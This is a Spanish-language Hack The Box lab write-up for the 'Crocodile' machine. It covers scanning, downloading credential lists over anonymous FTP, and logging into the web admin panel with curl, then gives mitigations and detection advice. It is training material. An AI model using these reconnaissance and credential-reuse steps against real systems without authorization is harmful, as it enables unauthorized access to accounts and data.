---
machine: Crocodile
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [ftp, web, credential-reuse, linux, tier1]
---

# Crocodile — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 1 · Linux · Very Easy

## TL;DR

El **FTP (21/tcp)** acepta login anónimo y sirve dos listas: usuarios permitidos y sus contraseñas. Con esas credenciales se entra al panel de administración del **Apache (80/tcp)** y la flag está en el dashboard.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

- **21/tcp** vsftpd con `ftp-anon: Anonymous FTP login allowed (FTP code 230)`.
- **80/tcp** Apache con una web corporativa y un `/login.php`.
- Superficie mínima: dos servicios, uno de ellos con un fallo de configuración evidente.

## Enumeración

```bash
ftp <TARGET_IP>
# Name: anonymous
# Password: <Enter>
ftp> ls -la
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
```

Contenido típico:

```text
allowed.userlist         → admin, apache, ...
allowed.userlist.passwd  → contraseña en claro de cada cuenta
```

En web:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php
```

```text
/login.php
/assets
/config.php   (vacío o sin salida)
```

- La web es la misma aplicación a la que pertenecen esas cuentas.
- El par usuario/contraseña del FTP no autentica en FTP (el servicio solo permite `anonymous`), pero sí en `/login.php`.

## Foothold

```bash
curl -s -X POST http://<TARGET_IP>/login.php \
  --data-urlencode "username=admin" \
  --data-urlencode "password=<PASSWORD_DEL_LISTADO>" -c cookies.txt
curl -s -b cookies.txt http://<TARGET_IP>/dashboard.php
```

El panel devuelve la flag. La cadena se sostiene en dos errores independientes:

1. **FTP anónimo** con documentación sensible en la raíz.
2. **Reutilización de credenciales** entre el FTP y la aplicación web.

Ninguno de los dos es una vulnerabilidad de código: son fallos de exposición y de gestión de secretos.

## Movimiento lateral

- Las mismas credenciales se prueban en SSH (cerrado) y en el panel web (válidas).
- No hay más hosts: el «movimiento» es entre servicios del mismo equipo.

## Escalada de privilegios

- No aplica: la flag se obtiene desde la aplicación autenticada.
- El usuario del panel no expone funciones de sistema ni ejecución de comandos.

## Evidencia

- Listado de la raíz FTP con los dos ficheros (nombres visibles, contenido redactado).
- Sesión autenticada en `/dashboard.php` y flag redactada.

## Lecciones aprendidas

- `ftp-anon` en el escaneo no es ruido: es un hallazgo que se enumera siempre.
- Los ficheros de cuentas permitidas son un patrón clásico de laboratorio y de redes reales mal gestionadas.
- Reutilizar credenciales entre servicios multiplica el impacto de una filtración.
- El login web no se fuerza: se rellena con lo que ya has encontrado.

## Mitigaciones y detección

**Cómo se corrige:**

- Deshabilitar el acceso anónimo (`anonymous_enable=NO`) y revisar el contenido servido por FTP.
- No almacenar credenciales en claro; gestor de secretos y rotación.
- Contraseñas distintas por servicio, MFA en el panel administrativo.
- Permisos mínimos en el directorio FTP y SFTP en lugar de FTP.

**Cómo se detectaría:**

- Sesiones FTP anónimas (`230 Login successful` con usuario `anonymous`).
- Acceso a `allowed.userlist*` en los logs del servidor FTP.
- Login web desde una IP que antes descargó esos ficheros (correlación de logs).

- CWE-521: Weak Password Requirements
- CWE-257: Storing Passwords in a Recoverable Format
- OWASP Top 10 2021: A07 Identification and Authentication Failures
- MITRE ATT&CK: [T1078 Valid Accounts](https://attack.mitre.org/techniques/T1078/), [T1021.002 SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/) no aplica aquí; el acceso es HTTP.

## Referencias

- [OWASP — Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)
- [CIS Benchmarks — vsftpd](https://www.cisecurity.org/benchmark/distribution_independent_linux)
